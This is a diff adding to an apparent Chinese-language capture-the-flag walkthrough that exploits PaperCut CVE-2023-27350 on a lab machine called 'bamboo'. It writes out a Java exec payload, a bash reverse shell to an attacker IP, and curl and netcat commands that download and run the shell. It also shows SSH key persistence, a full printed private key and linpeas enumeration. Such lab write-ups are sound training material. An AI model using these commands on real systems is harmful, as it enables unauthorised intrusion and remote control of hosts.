@@ -274,7 +274,7 @@ https://raw.githubusercontent.com/horizon3ai/CVE-2023-27350/refs/heads/main/CVE-
 ```
 [★]$ wget https://raw.githubusercontent.com/horizon3ai/CVE-2023-27350/refs/heads/main/CVE-2023-27350.py
 ```
-#### 修改CVE-2023-27350.py
+#### 修改CVE-2023-27350.py  postback = "java.lang.Runtime.getRuntime().exec('{command}');"
 ```
 def execute(base_url, session, command):
     print('[*] Prepparing to execute...')
@@ -387,4 +387,159 @@ def execute(base_url, session, command):
 [*] Updating print.script.sandboxed to Y
 ```
 #### 回顾我们的 HTTP 服务器，我们看到了 GET 请求，这证明该脚本是有效的。
-#### 好像有点久啊
+```
+[★]$ python3 -m http.server 9000
+Serving HTTP on 0.0.0.0 port 9000 (http://0.0.0.0:9000/) ...
+10.129.238.16 - - [07/Mar/2026 02:30:34] "GET / HTTP/1.1" 200 -
+```
+#### 写反弹
+```
+[★]$ vi shell.sh
+[★]$ cat shell.sh
+#!/bin/bash
+sh -i >& /dev/tcp/10.10.14.27/5544 0>&1
+```
+```
+[★]$ proxychains4 python3 CVE-2023-27350.py --url 'http://10.129.238.16:9191' --command 'curl http://10.10.14.27:9000/shell.sh -o /tmp/shell.sh'
+[proxychains] config file found: /etc/proxychains.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[*] Papercut instance is vulnerable! Obtained valid JSESSIONID
+[*] Updating print-and-device.script.enabled to Y
+[*] Updating print.script.sandboxed to N
+[*] Prepparing to execute...
+[+] Executed successfully!
+[*] Updating print-and-device.script.enabled to N
+[*] Updating print.script.sandboxed to Y
+```
+```
+ [★]$ python3 -m http.server 9000
+Serving HTTP on 0.0.0.0 port 9000 (http://0.0.0.0:9000/) ...
+10.129.238.16 - - [07/Mar/2026 02:30:34] "GET / HTTP/1.1" 200 -
+10.129.238.16 - - [07/Mar/2026 02:59:49] code 404, message File not found
+10.129.238.16 - - [07/Mar/2026 03:00:02] "GET /shell.sh HTTP/1.1" 200 -
+```
+#### 运行反弹
+```
+[★]$ nc -lvnp 5544
+listening on [any] 5544 ...
+```
+```
+[★]$ proxychains4 python3 CVE-2023-27350.py --url 'http://10.129.238.16:9191' --command 'bash /tmp/shell.sh'
+[proxychains] config file found: /etc/proxychains.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[*] Papercut instance is vulnerable! Obtained valid JSESSIONID
+[*] Updating print-and-device.script.enabled to Y
+[*] Updating print.script.sandboxed to N
+[*] Prepparing to execute...
+[+] Executed successfully!
+[*] Updating print-and-device.script.enabled to N
+[*] Updating print.script.sandboxed to Y
+```
+#### 看着我们的听众，我们接收到来自 PaperCut 主机的连接。然后我们使用脚本，该脚本创建了一个伪终端，并使用参数 -c /bin/bash 和 /dev/null 来启动一个新的交互式 bash 命令行，并丢弃输出日志，从而为我们提供一个更稳定的命令行环境。
+```
+[★]$ nc -lvnp 5544
+listening on [any] 5544 ...
+connect to [10.10.14.27] from (UNKNOWN) [10.129.238.16] 42222
+sh: 0: can't access tty; job control turned off
+$ script /dev/null -c /bin/bash
+Script started, output log file is '/dev/null'.
+papercut@bamboo:~/server$ id
+id
+uid=1001(papercut) gid=1001(papercut) groups=1001(papercut)
+papercut@bamboo:~/server$
+papercut@bamboo:~$ cat /home/papercut/user.txt
+```
+### Privilege Escalation
+```
+papercut@bamboo:~$ mkdir .ssh
+mkdir .ssh
+papercut@bamboo:~$ ssh-keygen
+ssh-keygen
+Generating public/private rsa key pair.
+Enter file in which to save the key (/home/papercut/.ssh/id_rsa): 
+
+Enter passphrase (empty for no passphrase): 
+
+Enter same passphrase again: 
+
+Your identification has been saved in /home/papercut/.ssh/id_rsa
+Your public key has been saved in /home/papercut/.ssh/id_rsa.pub
+The key fingerprint is:
+SHA256:JAMXPIdEcJvOKiZ14QexhEI7G35GXM/cKt/lp4D2LCE papercut@bamboo
+The key's randomart image is:
++---[RSA 3072]----+
+|.. .=**o         |
+|. +..*Boo        |
+| = o+ =*..       |
+|. =. = +.        |
+| o.oo.+.S  .     |
+| .o. Eo.o o      |
+|. o . .+.o . .   |
+| o .  ..o . o    |
+|        .o .     |
++----[SHA256]-----+
+papercut@bamboo:~$ cd .ssh
+cd .ssh
+papercut@bamboo:~/.ssh$ ls -la
+ls -la
+total 16
+drwxr-xr-x 2 papercut papercut 4096 Mar  7 09:11 .
+drwxr-xr-x 9 papercut papercut 4096 Mar  7 09:10 ..
+-rw------- 1 papercut papercut 2602 Mar  7 09:11 id_rsa
+-rw-r--r-- 1 papercut papercut  569 Mar  7 09:11 id_rsa.pub
+papercut@bamboo:~/.ssh$
+papercut@bamboo:~/.ssh$ cat id_rsa.pub >> authorized_keys
+cat id_rsa.pub >> authorized_keys
+papercut@bamboo:~/.ssh$ cat id_rsa
+cat id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+-----END OPENSSH PRIVATE KEY-----
+
+```
+#### 习惯就
+```
+[★]$ vi id_rsa
+[★]$ chmod 600 id_rsa
+```
+#### 现在，我们将使用 linpeas 来对系统进行枚举。linpeas 是一个自动化的本地 Linux 枚举脚本，用于查找常见的权限提升途径。
+```
+[★]$ wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
+```
+
+#### 从输出结果中我们可以看到，linpeas在路径中找到了 /home/papercut/server/bin/linux-x64 。如果一个具有特权权限的进程使用了该路径，并且该目录可被非特权用户写入，那么我们就可以在其中放置一个脚本或二进制文件，当该进程调用一个常见的命令时，该文件可能会被执行，从而可能导致权限提升后的 shell 环境。因此，我们接着检查了该文件夹的权限。
